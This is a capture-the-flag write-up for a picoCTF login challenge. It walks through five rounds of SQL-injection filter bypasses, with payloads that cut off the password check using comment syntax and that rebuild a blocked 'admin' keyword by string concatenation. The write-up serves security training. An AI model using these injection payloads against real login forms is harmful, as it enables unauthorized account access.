## Description
Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:9683/ http://jupiter.challenges.picoctf.org:9683/filter.php

## Solution
In this challenge we face a login page that seem to have 5 rounds.
We should do sql injection on login page and in each round will give us hint on prevention method we should bypass
(This hint about each round is provided in `filter.php` path)
Also it will render sql query that is made in source codes (we can see it in view page source after submiting query)

checking login page:
```
payload: user=admin&pass=123

response: SELECT * FROM users WHERE username='admin' AND password='123'
```

Ok easy. we can bypass it with: `username=admin' --&password=test` and this will make a query like below and pass us to round 2:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='test'
```

In round 2, `filter.php` will output us: `Round2: or and like = --`.
Ok both `or` and `like` or `=` or `--` are filtered. Let's try to comment the rest of sql after username with other type of commenting in sqlite which is `/**/`.

Let's try payload `username=admin';+/*&password=test` which make sql like:
```sql
SELECT * FROM users WHERE username='admin'; /* AND password='test'
```

On round 3, we get following filtering rule by checking filter.php: `Round3: or and = like > < --`
Let's try to previous payload, cause it seem to be working here again. and it worked. leading us to round4

Ok in round 4, checking filter.php will get us: `Round4: or and = like > < -- admin`
It seem the admin is filtered which is used to login us as admin.

We can use concat feature in sqlite and make `'admin'` string like `'ad'||'min'`. and our payload is: `username=ad'||'min';+/*&password=test`

On round 5 checking filter.php will get us: `Round5: or and = like > < -- union admin`

It seem that we can still use previous solution. let try it and we get the flag.